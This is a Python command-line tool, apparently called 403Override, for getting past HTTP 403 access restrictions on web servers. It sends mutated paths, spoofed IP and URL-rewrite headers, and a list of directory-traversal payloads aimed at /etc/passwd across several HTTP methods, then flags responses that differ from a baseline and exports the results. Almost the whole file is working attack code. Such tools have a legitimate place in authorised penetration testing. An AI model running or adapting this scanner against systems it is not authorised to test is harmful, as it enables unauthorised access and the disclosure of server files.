#!/usr/bin/env python3
import os
import sys
import argparse
import validators
import tldextract
import asyncio
import aiohttp
import json
import csv
from datetime import datetime
from aiohttp_proxy import ProxyConnector

# UI and Reporting Libraries
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from jinja2 import Template

console = Console()

class PathRepository:
    def __init__(self, path, args):
        self.path = path.rstrip("/") if path != "/" else "/"
        self.args = args
        self.headers_to_test = self.load_list('headers.txt', ["X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "X-Host"])
        self.ip_values = self.load_list('ip_address.txt', ["127.0.0.1", "localhost", "0x7F000001"])
        
        if self.args.try_methods:
            self.methods = self.load_list('methods.txt', ["GET", "POST", "HEAD"])
        else:
            self.methods = ["GET", "POST"]

        self.new_paths = self.create_new_paths()
        self.new_headers = self.create_new_headers()

    def load_list(self, filename, defaults):
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                lines = [line.strip().upper() for line in f if line.strip() and not line.startswith("#")]
                if lines: return lines
        return defaults

    def create_new_paths(self):
        trailings = ["/", "..;/", "/..;/", "%20", "%09", "%00", ".json", ".css", ".html", "?", "??", "???", "?anyparam", "#", "#anything", "/.","..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252fpasswd", "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "%252e%252e%252fetc%252fpasswd", "%252e%252e%252fetc%252fpasswd%00", "a/../../../../../../../../../etc/passwd......", "a/../../../../../../../../../../../../../../../../etc/passwd/././.", "a/./......../etc/passw", "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd", "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"]
        paths = [self.path]
        for t in trailings: paths.append(f"{self.path}{t}")
        paths.extend([f"/{self.path}//", f"/.{self.path}/./", f"/%2e{self.path}"])
        return list(set(paths))

    def create_new_headers(self):
        new_headers = []
        for h in self.headers_to_test:
            for ip in self.ip_values: new_headers.append({h: ip})
        for h in ["X-Original-URL", "X-Rewrite-URL"]: new_headers.append({h: self.path})
        return new_headers

class Query:
    def __init__(self, url, path_repo, session, args, has_cookies):
        self.base_url = url.rstrip("/")
        self.path_repo = path_repo
        self.session = session
        self.args = args
        self.has_cookies = "Yes" if has_cookies else "No"
        self.results = []
        self.baseline_size = 0
        self.baseline_status = 0

    async def send_request(self, method, path, headers=None, is_baseline=False):
        url = f"{self.base_url}{path}"
        if self.args.delay > 0:
            await asyncio.sleep(self.args.delay / 1000)

        try:
            async with self.session.request(method, url, headers=headers, allow_redirects=False) as resp:
                content = await resp.read()
                text_content = content.decode('utf-8', errors='ignore')
                
                res = {
                    "method": method,
                    "url": url,
                    "headers": json.dumps(headers) if headers else "None",
                    "status": resp.status,
                    "size": len(content),
                    "cookies": self.has_cookies,
                    "baseline_size": self.baseline_size, # Attached for later comparison
                    "baseline_status": self.baseline_status,
                    "note": ""
                }

                if is_baseline: return res

                if self.args.grep and self.args.grep in text_content:
                    res["note"] += f"[Grep Hit] "
                if self.args.soft and resp.status != self.baseline_status:
                    res["note"] += f"Status Change "
                if res['size'] != self.baseline_size:
                    res["note"] += "Size Diff "

                return res
        except Exception:
            return None

    async def run(self, progress, task_id):
        if self.args.baseline:
            base = await self.send_request('GET', self.path_repo.path, is_baseline=True)
            if base:
                self.baseline_size = base['size']
                self.baseline_status = base['status']

        queue = []
        for m in self.path_repo.methods:
            queue.append((m, self.path_repo.path, None))
            for p in self.path_repo.new_paths: queue.append((m, p, None))
            for h in self.path_repo.new_headers: queue.append((m, self.path_repo.path, h))

        progress.update(task_id, total=len(queue))
        
        for m, p, h in queue:
            res = await self.send_request(m, p, headers=h)
            if res:
                res['baseline_size'] = self.baseline_size # Ensure it's set
                if self.args.hide_size and res['size'] == self.baseline_size:
                    progress.advance(task_id)
                    continue
                self.results.append(res)
            progress.advance(task_id)
        return self.results

def save_reports(results, args):
    if not results: return
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    base_name = f"403override_{ts}"
    if args.json:
        with open(f"{base_name}.json", 'w') as f: json.dump(results, f, indent=4)
    if args.csv:
        with open(f"{base_name}.csv", 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=results[0].keys())
            writer.writeheader()
            writer.writerows(results)
    if args.html:
        html_template = """
        <!DOCTYPE html><html><head><title>403Override Report</title>
        <link rel="stylesheet" href="https://cdn.datatables.net/1.13.6/css/jquery.dataTables.min.css">
        <style>body{font-family:sans-serif;padding:20px;background:#f8f9fa;}.status-200{color:green;font-weight:bold;}.status-403{color:red;}</style></head>
        <body><h2>Scan Results - {{ ts }}</h2>
        <table id="resultsTable" class="display"><thead><tr><th>Method</th><th>Status</th><th>Size</th><th>Cookies</th><th>Bypass Info</th><th>Note</th><th>URL</th></tr></thead>
        <tbody>{% for r in results %}<tr><td>{{r.method}}</td><td class="status-{{r.status}}">{{r.status}}</td><td>{{r.size}}</td><td>{{r.cookies}}</td><td><code>{{r.headers}}</code></td><td>{{r.note}}</td><td><a href="{{r.url}}" target="_blank">{{r.url}}</a></td></tr>{% endfor %}</tbody>
        </table><script src="https://code.jquery.com/jquery-3.7.0.js"></script><script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
        <script>$(document).ready(function(){ $('#resultsTable').DataTable(); });</script></body></html>"""
        with open(f"{base_name}.html", 'w') as f: f.write(Template(html_template).render(results=results, ts=ts))

async def start_scan(args):
    urls = [args.url] if args.url else []
    if args.urllist:
        with open(args.urllist, 'r') as f: urls.extend([line.strip() for line in f if validators.url(line.strip())])
    dirs = [args.dir] if args.dir else ["/"]
    cookie_dict = {n: v for c in (args.cookies or "").split(';') if '=' in c for n, v in [c.strip().split('=', 1)]}
    connector = ProxyConnector.from_url(args.proxy) if args.proxy else None
    all_final_results = []
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TaskProgressColumn(), console=console) as progress:
        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=20)) as unauth_session, \
                   aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=20), cookies=cookie_dict) as auth_session:
            
            tasks = []
            for u in urls:
                for d in dirs:
                    repo = PathRepository(d, args)
                    if args.cookies:
                        tasks.append(Query(u, repo, auth_session, args, True).run(progress, progress.add_task(f"[cyan]Auth: {u}{d}", total=None)))
                    if args.unauth or not args.cookies:
                        tasks.append(Query(u, repo, unauth_session, args, False).run(progress, progress.add_task(f"[white]Unauth: {u}{d}", total=None)))

            results_lists = await asyncio.gather(*tasks)
            for r_list in results_lists: all_final_results.extend(r_list)

    # CLI Table Output
    table = Table(title="403Override - Scan Summary", show_header=True, header_style="bold blue")
    table.add_column("Method", width=8)
    table.add_column("Status", width=10)
    table.add_column("Size", width=10)
    table.add_column("Cookies", width=8)
    table.add_column("Bypass Info (Header:Value)", style="yellow", width=35)
    table.add_column("Note", style="bold cyan", width=15)
    table.add_column("URL", overflow="fold")

    for r in all_final_results:
        color = "green" if 200 <= r['status'] < 300 else "magenta" if r['status'] in [401, 403] else "white"
        
        # Determine Note logic using attached baseline size
        final_note = r['note']
        if args.baseline and r['size'] != r.get('baseline_size', 0):
            if "Size Diff" not in final_note: final_note += "Size Diff "

        table.add_row(
            r['method'],
            f"[{color}]{r['status']}[/]",
            str(r['size']),
            r['cookies'],
            r['headers'],
            final_note,
            r['url']
        )

    console.print(table)
    save_reports(all_final_results, args)

def main():
    parser = argparse.ArgumentParser(description="403Override Scanner - Final Fixed Pro")
    parser.add_argument("-u", "--url", help="Single URL")
    parser.add_argument("-U", "--urllist", help="URL list file")
    parser.add_argument("-d", "--dir", help="Single directory")
    parser.add_argument("-t", "--threads", type=int, default=5)
    parser.add_argument("-c", "--cookies", help='Cookie string')
    parser.add_argument("--proxy", help='Proxy URL (e.g. http://127.0.0.1:8080)')
    parser.add_argument("--delay", type=int, default=0, help="Delay in ms")
    parser.add_argument("--grep", help="String search")
    parser.add_argument("--baseline", type=bool, default=True, help="Set baseline reference")
    parser.add_argument("--soft", action="store_true", help="Flag status code changes")
    parser.add_argument("--unauth", action="store_true", help="Run unauth alongside cookies")
    parser.add_argument("--hide-size", action="store_true", help="Hide results matching baseline size")
    parser.add_argument("--try-methods", action="store_true", help="Use methods.txt")
    
    # Output Arguments
    parser.add_argument("--json", action="store_true", help="Output results in JSON format")
    parser.add_argument("--csv", action="store_true", help="Output results in CSV format")
    parser.add_argument("--html", action="store_true", help="Output results in HTML format")

    args = parser.parse_args()
    if not args.url and not args.urllist: return
    try: asyncio.run(start_scan(args))
    except KeyboardInterrupt: console.print("\n[bold yellow]Aborted.")

if __name__ == "__main__":
    main()